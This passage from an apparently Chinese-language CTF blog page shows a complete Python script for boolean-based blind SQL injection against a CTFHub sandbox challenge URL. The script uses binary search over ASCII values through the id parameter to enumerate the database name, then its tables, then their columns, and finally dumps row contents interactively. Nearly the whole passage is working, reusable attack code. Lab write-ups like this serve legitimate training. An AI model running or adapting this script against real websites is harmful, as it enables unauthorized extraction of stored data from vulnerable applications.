class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br>success_flag = <span class="hljs-string">&quot;query_success&quot;</span> <span class="hljs-comment">#成功查询到内容的关键字</span><br>base_url = <span class="hljs-string">&quot;http://challenge-d41158772186d1b6.sandbox.ctfhub.com:10800/?id=&quot;</span><br>headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_database_length</span>():<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and length(database()) = &quot;</span> + <span class="hljs-built_in">str</span>(length)<br>        url = base_url + quote(<span class="hljs-built_in">id</span>) <span class="hljs-comment">#很重要，因为id中有许多特殊字符，比如#，需要进行url编码</span><br>        response = requests.get(url, headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;database length&quot;</span>, length, <span class="hljs-string">&quot;failed!&quot;</span>)<br>            length+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;database length&quot;</span>, length, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库名的长度为&quot;</span>, length)<br>    <span class="hljs-keyword">return</span> length<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_database</span>(<span class="hljs-params">database_length</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    database = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, database_length + <span class="hljs-number">1</span>):<br>        l, r = <span class="hljs-number">0</span>, <span class="hljs-number">127</span> <span class="hljs-comment">#神奇的申明方法</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">ascii</span> = (l + r) // <span class="hljs-number">2</span><br>            id_equal = <span class="hljs-string">&quot;1 and ascii(substr(database(), &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) = &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>            response = requests.get(base_url + quote(id_equal), headers=headers).text<br>            <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                database += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ascii</span>)<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;目前已知数据库名&quot;</span>, database)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                id_bigger = <span class="hljs-string">&quot;1 and ascii(substr(database(), &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) &gt; &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>                response = requests.get(base_url + quote(id_bigger), headers=headers).text<br>                <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                    l = <span class="hljs-built_in">ascii</span> + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    r = <span class="hljs-built_in">ascii</span> - <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库名为&quot;</span>, database)<br>    <span class="hljs-keyword">return</span> database<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_table_num</span>(<span class="hljs-params">database</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    num = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select count(table_name) from information_schema.tables where table_schema = &#x27;&quot;</span> + database + <span class="hljs-string">&quot;&#x27;) = &quot;</span> + <span class="hljs-built_in">str</span>(num)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库中有&quot;</span>, num, <span class="hljs-string">&quot;个表&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            num += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> num<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_table_length</span>(<span class="hljs-params">index, database</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select length(table_name) from information_schema.tables where table_schema = &#x27;&quot;</span> + database + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;, 1) = &quot;</span> + <span class="hljs-built_in">str</span>(length)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table length&quot;</span>, length, <span class="hljs-string">&quot;failed!&quot;</span>)<br>            length+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;table length&quot;</span>, length, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表名的长度为&quot;</span>, length)<br>    <span class="hljs-keyword">return</span> length<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_table</span>(<span class="hljs-params">index, table_length, database</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    table = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, table_length + <span class="hljs-number">1</span>):<br>        l, r = <span class="hljs-number">0</span>, <span class="hljs-number">127</span> <span class="hljs-comment">#神奇的申明方法</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">ascii</span> = (l + r) // <span class="hljs-number">2</span><br>            id_equal = <span class="hljs-string">&quot;1 and (select ascii(substr(table_name, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from information_schema.tables where table_schema = &#x27;&quot;</span> + database + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) = &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>            response = requests.get(base_url + quote(id_equal), headers=headers).text<br>            <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                table += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ascii</span>)<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;目前已知数据库名&quot;</span>, table)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                id_bigger = <span class="hljs-string">&quot;1 and (select ascii(substr(table_name, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from information_schema.tables where table_schema = &#x27;&quot;</span> + database + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) &gt; &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>                response = requests.get(base_url + quote(id_bigger), headers=headers).text<br>                <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                    l = <span class="hljs-built_in">ascii</span> + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    r = <span class="hljs-built_in">ascii</span> - <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表名为&quot;</span>, table)<br>    <span class="hljs-keyword">return</span> table<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_column_num</span>(<span class="hljs-params">table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    num = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select count(column_name) from information_schema.columns where table_name = &#x27;&quot;</span> + table + <span class="hljs-string">&quot;&#x27;) = &quot;</span> + <span class="hljs-built_in">str</span>(num)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;中有&quot;</span>, num, <span class="hljs-string">&quot;个字段&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            num += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> num<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_column_length</span>(<span class="hljs-params">index, table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select length(column_name) from information_schema.columns where table_name = &#x27;&quot;</span> + table + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;, 1) = &quot;</span> + <span class="hljs-built_in">str</span>(length)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column length&quot;</span>, length, <span class="hljs-string">&quot;failed!&quot;</span>)<br>            length+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;column length&quot;</span>, length, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, index, <span class="hljs-string">&quot;个字段的长度为&quot;</span>, length)<br>    <span class="hljs-keyword">return</span> length<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_column</span>(<span class="hljs-params">index, column_length, table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    column = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, column_length + <span class="hljs-number">1</span>):<br>        l, r = <span class="hljs-number">0</span>, <span class="hljs-number">127</span> <span class="hljs-comment">#神奇的申明方法</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">ascii</span> = (l + r) // <span class="hljs-number">2</span><br>            id_equal = <span class="hljs-string">&quot;1 and (select ascii(substr(column_name, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from information_schema.columns where table_name = &#x27;&quot;</span> + table + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) = &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>            response = requests.get(base_url + quote(id_equal), headers=headers).text<br>            <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                column += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ascii</span>)<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;目前已知字段为&quot;</span>, column)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                id_bigger = <span class="hljs-string">&quot;1 and (select ascii(substr(column_name, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from information_schema.columns where table_name = &#x27;&quot;</span> + table + <span class="hljs-string">&quot;&#x27; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) &gt; &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>                response = requests.get(base_url + quote(id_bigger), headers=headers).text<br>                <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                    l = <span class="hljs-built_in">ascii</span> + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    r = <span class="hljs-built_in">ascii</span> - <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, index, <span class="hljs-string">&quot;个字段名为&quot;</span>, column)<br>    <span class="hljs-keyword">return</span> column<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_num</span>(<span class="hljs-params">column, table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    num = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select count(&quot;</span> + column + <span class="hljs-string">&quot;) from &quot;</span> + table + <span class="hljs-string">&quot;) = &quot;</span> + <span class="hljs-built_in">str</span>(num)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;中有&quot;</span>, num, <span class="hljs-string">&quot;行数据&quot;</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            num += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> num<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_length</span>(<span class="hljs-params">index, column, table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">id</span> = <span class="hljs-string">&quot;1 and (select length(&quot;</span> + column + <span class="hljs-string">&quot;) from &quot;</span> + table + <span class="hljs-string">&quot; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;, 1) = &quot;</span> + <span class="hljs-built_in">str</span>(length)<br>        response = requests.get(base_url + quote(<span class="hljs-built_in">id</span>), headers=headers).text<br>        <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag length&quot;</span>, length, <span class="hljs-string">&quot;failed!&quot;</span>)<br>            length+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag length&quot;</span>, length, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload:&quot;</span>, <span class="hljs-built_in">id</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, index, <span class="hljs-string">&quot;行数据的长度为&quot;</span>, length)<br>    <span class="hljs-keyword">return</span> length<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>(<span class="hljs-params">index, flag_length, column, table</span>):<br>    <span class="hljs-keyword">global</span> success_flag, base_url, headers, cookies<br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, flag_length + <span class="hljs-number">1</span>):<br>        l, r = <span class="hljs-number">0</span>, <span class="hljs-number">127</span> <span class="hljs-comment">#神奇的申明方法</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):<br>            <span class="hljs-built_in">ascii</span> = (l + r) // <span class="hljs-number">2</span><br>            id_equal = <span class="hljs-string">&quot;1 and (select ascii(substr(&quot;</span> + column + <span class="hljs-string">&quot;, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from &quot;</span> + table + <span class="hljs-string">&quot; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) = &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>            response = requests.get(base_url + quote(id_equal), headers=headers).text<br>            <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ascii</span>)<br>                <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;目前已知flag为&quot;</span>, flag)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                id_bigger = <span class="hljs-string">&quot;1 and (select ascii(substr(&quot;</span> + column + <span class="hljs-string">&quot;, &quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;, 1)) from &quot;</span> + table + <span class="hljs-string">&quot; limit &quot;</span> + <span class="hljs-built_in">str</span>(index) + <span class="hljs-string">&quot;,1) &gt; &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ascii</span>)<br>                response = requests.get(base_url + quote(id_bigger), headers=headers).text<br>                <span class="hljs-keyword">if</span> (success_flag <span class="hljs-keyword">in</span> response):<br>                    l = <span class="hljs-built_in">ascii</span> + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    r = <span class="hljs-built_in">ascii</span> - <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, index, <span class="hljs-string">&quot;行数据为&quot;</span>, flag)<br>    <span class="hljs-keyword">return</span> flag<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据库名长度&quot;</span>)<br>    database_length = get_database_length()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据库名&quot;</span>)<br>    database = get_database(database_length)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据表的个数&quot;</span>)<br>    table_num = get_table_num(database)<br>    tables = []<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, table_num):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;个数据表的名称的长度&quot;</span>)<br>        table_length = get_table_length(i, database)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;个数据表的名称&quot;</span>)<br>        table = get_table(i, table_length, database)<br>        tables.append(table)<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>): <span class="hljs-comment">#在这个循环中可以进入所有的数据表一探究竟</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;现在得到了以下数据表&quot;</span>, tables)<br>        table = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请在这些数据表中选择一个目标: &quot;</span>)<br>        <span class="hljs-keyword">while</span>( table <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> tables ):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;你输入有误&quot;</span>)<br>            table = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请重新选择一个目标&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;选择成功，开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;的字段数量&quot;</span>)<br>        column_num = get_column_num(table)<br>        columns = []<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, column_num):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;个字段名称的长度&quot;</span>)<br>            column_length = get_column_length(i, table)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;个字段的名称&quot;</span>)<br>            column = get_column(i, column_length, table)<br>            columns.append(column)<br>        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>): <span class="hljs-comment">#在这个循环中可以获取当前选择数据表的所有字段记录</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;现在得到了数据表&quot;</span>, table, <span class="hljs-string">&quot;中的以下字段&quot;</span>, columns)<br>            column = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请在这些字段中选择一个目标: &quot;</span>)<br>            <span class="hljs-keyword">while</span>( column <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> columns ):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;你输入有误&quot;</span>)<br>                column = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请重新选择一个目标&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;选择成功，开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;的记录数量&quot;</span>)<br>            flag_num = get_flag_num(column, table)<br>            flags = []<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, flag_num):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;的&quot;</span>, column, <span class="hljs-string">&quot;字段的第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;行记录的长度&quot;</span>)<br>                flag_length = get_flag_length(i, column, table)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始获取数据表&quot;</span>, table, <span class="hljs-string">&quot;的&quot;</span>, column, <span class="hljs-string">&quot;字段的第&quot;</span>, i + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;行记录的内容&quot;</span>)<br>                flag = get_flag(i, flag_length, column, table)<br>                flags.append(flag)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;现在得到了数据表&quot;</span>, table, <span class="hljs-string">&quot;中&quot;</span>, column, <span class="hljs-string">&quot;字段中的以下记录&quot;</span>, flags)<br>            quit = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;继续切换字段吗？(y/n)&quot;</span>)<br>            